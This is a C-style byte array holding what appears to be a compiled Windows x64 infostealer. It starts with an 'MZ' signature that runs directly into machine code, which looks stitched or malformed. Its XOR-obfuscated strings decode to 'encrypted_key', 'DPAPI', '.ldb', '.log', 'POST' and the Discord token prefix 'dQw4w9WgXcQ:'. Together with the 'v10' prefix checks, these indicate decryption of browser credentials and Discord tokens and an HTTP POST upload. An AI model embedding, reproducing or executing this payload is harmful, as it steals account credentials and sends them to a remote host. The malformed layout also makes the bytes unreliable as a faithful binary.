{0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
0x00, 0x00, 0x48, 0x8b, 0x3d, 0xc7, 0xb2, 0x00, 0x00, 0x75, 0x48, 0xc7, 0x45, 0x90, 0x5a, 0x00,
0x45, 0x00, 0x4c, 0x8d, 0x05, 0x47, 0xd8, 0x00, 0x00, 0xc7, 0x45, 0x94, 0x59, 0x00, 0x5e, 0x00,
0x49, 0x8b, 0xcc, 0x66, 0x44, 0x89, 0x65, 0x98, 0xba, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0xb7, 0x44,
0x0d, 0x90, 0x66, 0x33, 0xc2, 0x66, 0x42, 0x89, 0x04, 0x01, 0x48, 0x83, 0xc1, 0x02, 0x48, 0x83,
0xf9, 0x08, 0x72, 0xe9, 0x66, 0x44, 0x89, 0x25, 0x1c, 0xd8, 0x00, 0x00, 0xc6, 0x05, 0xcc, 0xb1,
0x00, 0x00, 0x01, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x80, 0x00, 0x4c, 0x8d, 0x85, 0x70, 0x02,
0x00, 0x00, 0x4c, 0x89, 0x64, 0x24, 0x28, 0x48, 0x8d, 0x15, 0xf2, 0xd7, 0x00, 0x00, 0x45, 0x33,
0xc9, 0x4c, 0x89, 0x64, 0x24, 0x20, 0x48, 0x8b, 0xce, 0xff, 0xd7, 0x48, 0x8b, 0xf8, 0x48, 0x85,
0xc0, 0x75, 0x0e, 0x48, 0x8b, 0xce, 0xff, 0x15, 0x6c, 0xb2, 0x00, 0x00, 0xe9, 0x5a, 0xff, 0xff,
0xff, 0x41, 0xb9, 0x00, 0x00, 0x00, 0xa0, 0x48, 0x8d, 0x95, 0x70, 0x04, 0x00, 0x00, 0x41, 0x83,
0xc8, 0xff, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0x2d, 0xb2, 0x00, 0x00, 0x48, 0x8b, 0x05, 0x2e, 0xb2,
0x00, 0x00, 0x4d, 0x8b, 0xcf, 0x4c, 0x89, 0x64, 0x24, 0x30, 0x45, 0x33, 0xc0, 0x44, 0x89, 0x6c,
0x24, 0x28, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0x44, 0x89, 0x6c, 0x24, 0x20, 0xff, 0xd0, 0x85, 0xc0,
0x74, 0x45, 0x48, 0x8b, 0x05, 0x0f, 0xb2, 0x00, 0x00, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0xff, 0xd0,
0x85, 0xc0, 0x74, 0x33, 0x48, 0x8d, 0x85, 0xb0, 0x06, 0x00, 0x00, 0x4c, 0x89, 0x64, 0x24, 0x28,
0x4c, 0x8d, 0x8d, 0xc0, 0x06, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc0, 0xc7,
0x85, 0xb0, 0x06, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xba, 0x13, 0x00, 0x00, 0x20, 0x48, 0x8b,
0xcf, 0xff, 0x15, 0xd9, 0xb1, 0x00, 0x00, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0xd8, 0xb1, 0x00, 0x00,
0x48, 0x8b, 0xce, 0xff, 0x15, 0xcf, 0xb1, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xc6, 0xb1,
0x00, 0x00, 0x81, 0xbd, 0xc0, 0x06, 0x00, 0x00, 0xc8, 0x00, 0x00, 0x00, 0x74, 0x3f, 0x48, 0x8b,
0x05, 0x6b, 0xb1, 0x00, 0x00, 0x33, 0xf6, 0x48, 0xc7, 0x85, 0xc8, 0x06, 0x00, 0x00, 0x00, 0xd3,
0xce, 0xfe, 0x48, 0x85, 0xc0, 0x74, 0x0b, 0x48, 0x8d, 0x95, 0xc8, 0x06, 0x00, 0x00, 0x33, 0xc9,
0xff, 0xd0, 0x4c, 0x8d, 0x25, 0x7f, 0xc8, 0x00, 0x00, 0x41, 0xff, 0xc6, 0x4c, 0x8d, 0x15, 0xed,
0xdf, 0x00, 0x00, 0x41, 0x83, 0xfe, 0x03, 0x0f, 0x8c, 0x45, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0x05,
0xfc, 0xb0, 0x00, 0x00, 0x41, 0xbc, 0x00, 0x80, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x3d, 0x45,
0x8b, 0xc4, 0x33, 0xd2, 0x49, 0x8b, 0xcf, 0xff, 0xd0, 0x48, 0x8b, 0x05, 0xe0, 0xb0, 0x00, 0x00,
0x48, 0x85, 0xc0, 0x74, 0x27, 0x48, 0x8b, 0x4d, 0xa8, 0x45, 0x8b, 0xc4, 0x33, 0xd2, 0xff, 0xd0,
0x48, 0x8b, 0x05, 0xc9, 0xb0, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x10, 0x48, 0x8b, 0x4d, 0xb0,
0x48, 0x85, 0xc9, 0x74, 0x07, 0x45, 0x8b, 0xc4, 0x33, 0xd2, 0xff, 0xd0, 0x8b, 0x85, 0xc0, 0x06,
0x00, 0x00, 0xe9, 0x2f, 0xf9, 0xff, 0xff, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x55, 0x48, 0x8b,
0xec, 0x48, 0x83, 0xec, 0x60, 0x45, 0x33, 0xdb, 0x48, 0x8d, 0x1d, 0x91, 0xc4, 0x00, 0x00, 0x44,
0x38, 0x1d, 0x62, 0xb3, 0x00, 0x00, 0x0f, 0x85, 0xcf, 0x00, 0x00, 0x00, 0xc7, 0x45, 0xa0, 0x32,
0x00, 0x3f, 0x00, 0x41, 0x8b, 0xd3, 0xc7, 0x45, 0xa4, 0x3f, 0x00, 0x3e, 0x00, 0xc7, 0x45, 0xa8,
0x33, 0x00, 0x38, 0x00, 0xc7, 0x45, 0xac, 0x39, 0x00, 0x3f, 0x00, 0xc7, 0x45, 0xb0, 0x32, 0x00,
0x3e, 0x00, 0xc7, 0x45, 0xb4, 0x30, 0x00, 0x4b, 0x00, 0xc7, 0x45, 0xb8, 0x4b, 0x00, 0x4c, 0x00,
0xc7, 0x45, 0xbc, 0x69, 0x00, 0x68, 0x00, 0xc7, 0x45, 0xc0, 0x5b, 0x00, 0x43, 0x00, 0xc7, 0x45,
0xc4, 0x42, 0x00, 0x4c, 0x00, 0xc7, 0x45, 0xc8, 0x68, 0x00, 0x44, 0x00, 0xc7, 0x45, 0xcc, 0x6e,
0x00, 0x7d, 0x00, 0xc7, 0x45, 0xd0, 0x3f, 0x00, 0x3f, 0x00, 0xc7, 0x45, 0xd4, 0x46, 0x00, 0x61,
0x00, 0xc7, 0x45, 0xd8, 0x3d, 0x00, 0x43, 0x00, 0xc7, 0x45, 0xdc, 0x6c, 0x00, 0x5e, 0x00, 0xc7,
0x45, 0xe0, 0x5e, 0x00, 0x3d, 0x00, 0xc7, 0x45, 0xe4, 0x49, 0x00, 0x6b, 0x00, 0xc7, 0x45, 0xe8,
0x68, 0x00, 0x48, 0x00, 0xc7, 0x45, 0xec, 0x3d, 0x00, 0x79, 0x00, 0xc7, 0x45, 0xf0, 0x3f, 0x00,
0x72, 0x00, 0xc7, 0x45, 0xf4, 0x4e, 0x00, 0x48, 0x00, 0xc7, 0x45, 0xf8, 0x4c, 0x00, 0x4f, 0x00,
0x66, 0x44, 0x89, 0x5d, 0xfc, 0x0f, 0xb7, 0x4c, 0x15, 0xa0, 0x66, 0x83, 0xf1, 0x0a, 0x66, 0x89,
0x0c, 0x1a, 0x48, 0x83, 0xc2, 0x02, 0x48, 0x83, 0xfa, 0x5c, 0x72, 0xe9, 0x66, 0x44, 0x89, 0x1d,
0x18, 0xc4, 0x00, 0x00, 0xc6, 0x05, 0x8d, 0xb2, 0x00, 0x00, 0x01, 0x48, 0x8b, 0xc3, 0x48, 0x8b,
0x5c, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x60, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24,
0x08, 0x48, 0x89, 0x7c, 0x24, 0x10, 0x45, 0x33, 0xc9, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x45,
0x8b, 0xd9, 0x66, 0x44, 0x39, 0x09, 0x74, 0x0a, 0x41, 0xff, 0xc3, 0x66, 0x46, 0x39, 0x0c, 0x59,
0x75, 0xf6, 0x45, 0x8b, 0xd1, 0x66, 0x44, 0x39, 0x0a, 0x74, 0x0a, 0x41, 0xff, 0xc2, 0x66, 0x46,
0x39, 0x0c, 0x52, 0x75, 0xf6, 0x45, 0x3b, 0xd3, 0x77, 0x4e, 0x45, 0x85, 0xd2, 0x74, 0x45, 0x0f,
0xb7, 0x13, 0x41, 0x8b, 0xc3, 0x41, 0x2b, 0xc2, 0x41, 0x03, 0xc1, 0x0f, 0xb7, 0x0c, 0x47, 0x8d,
0x41, 0xbf, 0x66, 0x83, 0xf8, 0x19, 0x44, 0x8d, 0x41, 0x20, 0x66, 0x44, 0x0f, 0x47, 0xc1, 0x0f,
0xb7, 0x0b, 0x66, 0x83, 0xc2, 0x20, 0x66, 0x83, 0xe9, 0x41, 0x66, 0x83, 0xf9, 0x19, 0x66, 0x0f,
0x47, 0x13, 0x66, 0x44, 0x3b, 0xc2, 0x75, 0x10, 0x41, 0xff, 0xc1, 0x48, 0x83, 0xc3, 0x02, 0x45,
0x3b, 0xca, 0x72, 0xbb, 0xb0, 0x01, 0xeb, 0x02, 0x32, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08, 0x48,
0x8b, 0x7c, 0x24, 0x10, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x7c,
0x24, 0x10, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x40, 0x80, 0x3d, 0x16, 0xb2, 0x00, 0x00,
0x00, 0x4c, 0x8d, 0x05, 0xc8, 0xb3, 0x00, 0x00, 0x48, 0x8b, 0xf9, 0x48, 0xc7, 0x45, 0xf8, 0x00,
0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x75, 0x3e, 0xc7, 0x45, 0xe0,
0x6f, 0x64, 0x69, 0x78, 0x33, 0xc9, 0xc7, 0x45, 0xe4, 0x73, 0x7a, 0x7e, 0x6f, 0xc7, 0x45, 0xe8,
0x6e, 0x55, 0x61, 0x6f, 0x66, 0xc7, 0x45, 0xec, 0x73, 0x00, 0x8a, 0x44, 0x0d, 0xe0, 0x34, 0x0a,
0x42, 0x88, 0x04, 0x01, 0x48, 0xff, 0xc1, 0x48, 0x83, 0xf9, 0x0d, 0x72, 0xed, 0xc6, 0x05, 0x89,
0xb3, 0x00, 0x00, 0x00, 0xc6, 0x05, 0xbc, 0xb1, 0x00, 0x00, 0x01, 0x48, 0x8d, 0x4d, 0xf0, 0xe8,
0x5c, 0xb9, 0xff, 0xff, 0x84, 0xc0, 0x75, 0x26, 0x48, 0x8b, 0x4d, 0xf0, 0x48, 0x85, 0xc9, 0x74,
0x16, 0x48, 0x8b, 0x05, 0x78, 0xae, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x0a, 0x33, 0xd2, 0x41,
0xb8, 0x00, 0x80, 0x00, 0x00, 0xff, 0xd0, 0x32, 0xc0, 0xe9, 0x9f, 0x00, 0x00, 0x00, 0x44, 0x8b,
0x55, 0xf8, 0xb9, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x5d, 0xf0, 0x44, 0x3b, 0xd1, 0x72, 0x68,
0x80, 0x3d, 0xbe, 0xb0, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x05, 0x7e, 0xc8, 0x00, 0x00, 0x75, 0x2f,
0xc7, 0x45, 0x20, 0x4e, 0x5a, 0x4b, 0x5a, 0x33, 0xd2, 0x66, 0xc7, 0x45, 0x24, 0x43, 0x00, 0x8a,
0x44, 0x15, 0x20, 0x34, 0x0a, 0x42, 0x88, 0x04, 0x02, 0x48, 0xff, 0xc2, 0x48, 0x3b, 0xd1, 0x72,
0xee, 0xc6, 0x05, 0x59, 0xc8, 0x00, 0x00, 0x00, 0xc6, 0x05, 0x86, 0xb0, 0x00, 0x00, 0x01, 0x48,
0x8b, 0xc3, 0x4c, 0x2b, 0xc3, 0x8a, 0x10, 0x48, 0xff, 0xc9, 0x41, 0x3a, 0x14, 0x00, 0x75, 0x18,
0x48, 0xff, 0xc0, 0x48, 0x85, 0xc9, 0x75, 0xed, 0x45, 0x8d, 0x42, 0xfb, 0x48, 0x8b, 0xcf, 0x48,
0x8d, 0x53, 0x05, 0xe8, 0x8c, 0xad, 0xff, 0xff, 0x48, 0x85, 0xdb, 0x74, 0x19, 0x48, 0x8b, 0x05,
0xdc, 0xad, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00,
0x00, 0x48, 0x8b, 0xcb, 0xff, 0xd0, 0x83, 0x7f, 0x08, 0x00, 0x0f, 0x97, 0xc0, 0x48, 0x8b, 0x5c,
0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x40, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc,
0x48, 0x85, 0xc9, 0x0f, 0x84, 0xb9, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08,
0x48, 0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x4c, 0x89, 0x70, 0x20, 0x55, 0x48, 0x8b, 0xec,
0x48, 0x83, 0xec, 0x60, 0x8b, 0xfa, 0x4d, 0x8b, 0xf0, 0x48, 0x8b, 0xf1, 0x83, 0xff, 0x14, 0x0f,
0x82, 0x74, 0x01, 0x00, 0x00, 0x4d, 0x85, 0xc0, 0x0f, 0x84, 0x6b, 0x01, 0x00, 0x00, 0x41, 0x83,
0xf9, 0x20, 0x0f, 0x85, 0x61, 0x01, 0x00, 0x00, 0x8d, 0x4f, 0x01, 0xe8, 0x34, 0x6f, 0xff, 0xff,
0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x4d, 0x01, 0x00, 0x00, 0x8b, 0xd7, 0x48, 0xc7,
0x45, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x8b, 0xca, 0x48, 0xc7, 0x45, 0xf0, 0x00, 0x00, 0x00, 0x00,
0x48, 0x8b, 0xf8, 0xf3, 0xa4, 0xc6, 0x04, 0x02, 0x00, 0x48, 0x8d, 0x4d, 0xf0, 0x48, 0x8b, 0xd0,
0xe8, 0x7b, 0xb3, 0xff, 0xff, 0x48, 0x8b, 0x3d, 0x24, 0xad, 0x00, 0x00, 0x48, 0x85, 0xff, 0x74,
0x14, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xff, 0xd7, 0x48, 0x8b,
0x3d, 0x0b, 0xad, 0x00, 0x00, 0x8b, 0x4d, 0xf8, 0x48, 0x8b, 0x75, 0xf0, 0x83, 0xf9, 0x1f, 0x0f,
0x86, 0xdd, 0x00, 0x00, 0x00, 0x80, 0x3e, 0x76, 0x0f, 0x85, 0xd4, 0x00, 0x00, 0x00, 0x80, 0x7e,
0x01, 0x31, 0x0f, 0x85, 0xca, 0x00, 0x00, 0x00, 0x80, 0x7e, 0x02, 0x30, 0x0f, 0x85, 0xc0, 0x00,
0x00, 0x00, 0x8d, 0x51, 0xe1, 0x85, 0xd2, 0x0f, 0x84, 0xb5, 0x00, 0x00, 0x00, 0x8d, 0x42, 0x1f,
0x3b, 0xc1, 0x0f, 0x87, 0xaa, 0x00, 0x00, 0x00, 0x8b, 0xca, 0x48, 0x8d, 0x46, 0x0f, 0x48, 0x83,
0xc1, 0x0f, 0x48, 0xc7, 0x45, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x03, 0xce, 0x48, 0xc7, 0x45,
0xf0, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x4c, 0x24, 0x38, 0x4c, 0x8d, 0x4e, 0x03, 0x89, 0x54,
0x24, 0x30, 0x48, 0x8d, 0x4d, 0xf0, 0x49, 0x8b, 0xd6, 0x48, 0x89, 0x44, 0x24, 0x28, 0x41, 0xb8,
0x20, 0x00, 0x00, 0x00, 0xe8, 0x87, 0xaf, 0xff, 0xff, 0x8b, 0x55, 0xf8, 0x48, 0x8b, 0x5d, 0xf0,
0x85, 0xd2, 0x74, 0x39, 0x33, 0xc9, 0x85, 0xd2, 0x74, 0x0c, 0x80, 0x3c, 0x19, 0x00, 0x75, 0x06,
0xff, 0xc1, 0x3b, 0xca, 0x72, 0xf4, 0x3b, 0xd1, 0x76, 0x23, 0x8d, 0x42, 0xff, 0x8b, 0xfa, 0x80,
0x3c, 0x18, 0x00, 0x8b, 0xd0, 0x75, 0x06, 0x3b, 0xc1, 0x77, 0xef, 0xeb, 0x10, 0x4c, 0x8b, 0x45,
0x30, 0x2b, 0xf9, 0x8b, 0xd7, 0x48, 0x03, 0xcb, 0xe8, 0x73, 0x92, 0xff, 0xff, 0x48, 0x8b, 0x3d,
0x3c, 0xac, 0x00, 0x00, 0x48, 0x85, 0xdb, 0x74, 0x19, 0x48, 0x85, 0xff, 0x74, 0x14, 0x33, 0xd2,
0x41, 0xb8, 0x00, 0x80, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xff, 0xd7, 0x48, 0x8b, 0x3d, 0x1e, 0xac,
0x00, 0x00, 0x48, 0x85, 0xf6, 0x74, 0x12, 0x48, 0x85, 0xff, 0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8,
0x00, 0x80, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xff, 0xd7, 0x4c, 0x8d, 0x5c, 0x24, 0x60, 0x49, 0x8b,
0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x4d, 0x8b, 0x73, 0x28, 0x49, 0x8b,
0xe3, 0x5d, 0xc3, 0xcc, 0x48, 0x85, 0xc9, 0x0f, 0x84, 0xbd, 0x04, 0x00, 0x00, 0x48, 0x8b, 0xc4,
0x48, 0x89, 0x58, 0x20, 0x44, 0x89, 0x40, 0x18, 0x48, 0x89, 0x50, 0x10, 0x48, 0x89, 0x48, 0x08,
0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xa8, 0x98, 0xf4,
0xff, 0xff, 0x48, 0x81, 0xec, 0x30, 0x0c, 0x00, 0x00, 0x4d, 0x8b, 0xe9, 0x4c, 0x8b, 0xf9, 0x33,
0xf6, 0xe8, 0xa2, 0x99, 0xff, 0xff, 0x84, 0xc0, 0x0f, 0x84, 0x62, 0x04, 0x00, 0x00, 0x41, 0x8a,
0x17, 0x48, 0x8d, 0x85, 0x80, 0x06, 0x00, 0x00, 0x84, 0xd2, 0x74, 0x19, 0x48, 0x8d, 0xbd, 0x80,
0x06, 0x00, 0x00, 0x49, 0x8b, 0xcf, 0x48, 0x2b, 0xcf, 0x88, 0x10, 0x48, 0xff, 0xc0, 0x8a, 0x14,
0x01, 0x84, 0xd2, 0x75, 0xf4, 0x40, 0x38, 0x35, 0xe8, 0xad, 0x00, 0x00, 0x48, 0x8d, 0x15, 0xcd,
0xd6, 0x00, 0x00, 0x40, 0x88, 0x30, 0x75, 0x2f, 0x66, 0xc7, 0x44, 0x24, 0x30, 0x56, 0x20, 0x48,
0x8b, 0xce, 0x40, 0x88, 0x74, 0x24, 0x32, 0x8a, 0x44, 0x0c, 0x30, 0x34, 0x0a, 0x88, 0x04, 0x11,
0x48, 0xff, 0xc1, 0x48, 0x83, 0xf9, 0x02, 0x72, 0xee, 0x40, 0x88, 0x35, 0xa2, 0xd6, 0x00, 0x00,
0xc6, 0x05, 0xad, 0xad, 0x00, 0x00, 0x01, 0x48, 0x8d, 0x8d, 0x80, 0x06, 0x00, 0x00, 0xe8, 0x69,
0x97, 0xff, 0xff, 0x48, 0x8d, 0x8d, 0x80, 0x06, 0x00, 0x00, 0xe8, 0xb1, 0x97, 0xff, 0xff, 0x48,
0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xd5, 0x03, 0x00, 0x00, 0x33, 0xc0, 0x48, 0x8d, 0x7d,
0x80, 0xb9, 0x50, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x55, 0x80, 0xf3, 0xaa, 0x48, 0x8b, 0x3d, 0xdd,
0xac, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xff, 0xd7, 0x48, 0x8b, 0x3d, 0xf1, 0xaa, 0x00, 0x00, 0x4c,
0x8b, 0xe0, 0x48, 0x89, 0x44, 0x24, 0x78, 0x48, 0x85, 0xff, 0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8,
0x00, 0x80, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xff, 0xd7, 0x49, 0x83, 0xfc, 0xff, 0x0f, 0x84, 0x8d,
0x03, 0x00, 0x00, 0x48, 0x8d, 0x15, 0xee, 0xb4, 0x00, 0x00, 0x41, 0xbe, 0x6d, 0x00, 0x00, 0x00,
0x48, 0x8d, 0x1d, 0x11, 0xb2, 0x00, 0x00, 0x48, 0x8d, 0x3d, 0xca, 0xcd, 0x00, 0x00, 0xf6, 0x45,
0x80, 0x10, 0x0f, 0x85, 0x43, 0x03, 0x00, 0x00, 0x40, 0x38, 0x35, 0xc1, 0xac, 0x00, 0x00, 0x75,
0x3d, 0xc7, 0x44, 0x24, 0x58, 0x24, 0x00, 0x66, 0x00, 0x48, 0x8b, 0xce, 0xc7, 0x44, 0x24, 0x5c,
0x6e, 0x00, 0x68, 0x00, 0x66, 0x89, 0x74, 0x24, 0x60, 0x0f, 0xb7, 0x44, 0x0c, 0x58, 0x66, 0x83,
0xf0, 0x0a, 0x66, 0x89, 0x04, 0x11, 0x48, 0x83, 0xc1, 0x02, 0x48, 0x83, 0xf9, 0x08, 0x72, 0xe9,
0x66, 0x89, 0x35, 0x99, 0xb4, 0x00, 0x00, 0xc6, 0x05, 0x82, 0xac, 0x00, 0x00, 0x01, 0x48, 0x8d,
0x4d, 0xac, 0xe8, 0xb5, 0xfa, 0xff, 0xff, 0x84, 0xc0, 0x75, 0x5a, 0x40, 0x38, 0x35, 0x96, 0xad,
0x00, 0x00, 0x75, 0x3d, 0xc7, 0x44, 0x24, 0x68, 0x24, 0x00, 0x66, 0x00, 0x48, 0x8b, 0xce, 0xc7,
0x44, 0x24, 0x6c, 0x65, 0x00, 0x6d, 0x00, 0x66, 0x89, 0x74, 0x24, 0x70, 0x0f, 0xb7, 0x44, 0x0c,
0x68, 0x66, 0x83, 0xf0, 0x0a, 0x66, 0x89, 0x04, 0x19, 0x48, 0x83, 0xc1, 0x02, 0x48, 0x83, 0xf9,
0x08, 0x72, 0xe9, 0x66, 0x89, 0x35, 0x76, 0xb1, 0x00, 0x00, 0xc6, 0x05, 0x57, 0xad, 0x00, 0x00,
0x01, 0x48, 0x8b, 0xd3, 0x48, 0x8d, 0x4d, 0xac, 0xe8, 0x5f, 0xfa, 0xff, 0xff, 0x84, 0xc0, 0x0f,
0x84, 0x96, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0xac, 0xe8, 0x2e, 0x97, 0xff, 0xff, 0x4c, 0x8b,
0xd8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x81, 0x02, 0x00, 0x00, 0x41, 0x8a, 0x17, 0x48, 0x8d, 0x8d,
0xd0, 0x01, 0x00, 0x00, 0x84, 0xd2, 0x74, 0x20, 0x48, 0x8d, 0x85, 0xd0, 0x01, 0x00, 0x00, 0x49,
0x8b, 0xff, 0x48, 0x2b, 0xf8, 0x88, 0x11, 0x48, 0xff, 0xc1, 0x8a, 0x14, 0x0f, 0x84, 0xd2, 0x75,
0xf4, 0x48, 0x8d, 0x3d, 0xd0, 0xcc, 0x00, 0x00, 0x40, 0x38, 0x35, 0xd6, 0xab, 0x00, 0x00, 0x40,
0x88, 0x31, 0x75, 0x10, 0x66, 0xc7, 0x05, 0x2b, 0xb1, 0x00, 0x00, 0x5c, 0x00, 0xc6, 0x05, 0xc1,
0xab, 0x00, 0x00, 0x01, 0x48, 0x8d, 0x15, 0x1d, 0xb1, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0xd0, 0x01,
0x00, 0x00, 0xe8, 0xc5, 0x95, 0xff, 0xff, 0x49, 0x8b, 0xd3, 0x48, 0x8d, 0x8d, 0xd0, 0x01, 0x00,
0x00, 0xe8, 0xb6, 0x95, 0xff, 0xff, 0x48, 0x8b, 0x05, 0x73, 0xa9, 0x00, 0x00, 0x48, 0x85, 0xc0,
0x74, 0x0d, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0x80, 0x00, 0x00, 0x49, 0x8b, 0xcb, 0xff, 0xd0, 0x48,
0xc7, 0x44, 0x24, 0x50, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x95, 0xd0, 0x01, 0x00, 0x00, 0x48,
0x89, 0x74, 0x24, 0x48, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0x4d, 0x85, 0xed, 0x74, 0x0a, 0x4d, 0x8b,
0xc5, 0xe8, 0xd2, 0xc4, 0xff, 0xff, 0xeb, 0x05, 0xe8, 0x2f, 0xc4, 0xff, 0xff, 0x8b, 0x74, 0x24,
0x50, 0x4c, 0x8b, 0x74, 0x24, 0x48, 0x85, 0xf6, 0x0f, 0x84, 0x7e, 0x01, 0x00, 0x00, 0x4c, 0x8b,
0x85, 0x90, 0x0b, 0x00, 0x00, 0x8b, 0xd6, 0x49, 0x8b, 0xce, 0xe8, 0x41, 0x8f, 0xff, 0xff, 0x33,
0xd2, 0x48, 0x39, 0x95, 0x78, 0x0b, 0x00, 0x00, 0x0f, 0x84, 0x5e, 0x01, 0x00, 0x00, 0x83, 0xbd,
0x80, 0x0b, 0x00, 0x00, 0x20, 0x0f, 0x85, 0x51, 0x01, 0x00, 0x00, 0x4d, 0x85, 0xf6, 0x0f, 0x84,
0x6a, 0x01, 0x00, 0x00, 0x38, 0x15, 0x52, 0xa8, 0x00, 0x00, 0x75, 0x3d, 0xc7, 0x44, 0x24, 0x38,
0x6e, 0x5b, 0x7d, 0x3e, 0x8b, 0xca, 0xc7, 0x44, 0x24, 0x3c, 0x7d, 0x33, 0x5d, 0x6d, 0xc7, 0x44,
0x24, 0x40, 0x52, 0x69, 0x5b, 0x30, 0x88, 0x54, 0x24, 0x44, 0x8a, 0x44, 0x0c, 0x38, 0x34, 0x0a,
0x88, 0x04, 0x39, 0x48, 0xff, 0xc1, 0x48, 0x83, 0xf9, 0x0c, 0x72, 0xee, 0x88, 0x15, 0xd2, 0xcb,
0x00, 0x00, 0xc6, 0x05, 0x13, 0xa8, 0x00, 0x00, 0x01, 0x38, 0x15, 0xb9, 0xcb, 0x00, 0x00, 0x8b,
0xda, 0x74, 0x07, 0xff, 0xc3, 0x38, 0x14, 0x3b, 0x75, 0xf9, 0x8b, 0xfa, 0x3b, 0xde, 0x0f, 0x83,
0xe1, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xa5, 0x90, 0x0b, 0x00, 0x00, 0x4c, 0x8b, 0xbd, 0x78, 0x0b,
0x00, 0x00, 0x89, 0x54, 0x24, 0x30, 0x48, 0x8d, 0x44, 0x24, 0x30, 0x8b, 0xd6, 0x8b, 0xcf, 0x2b,
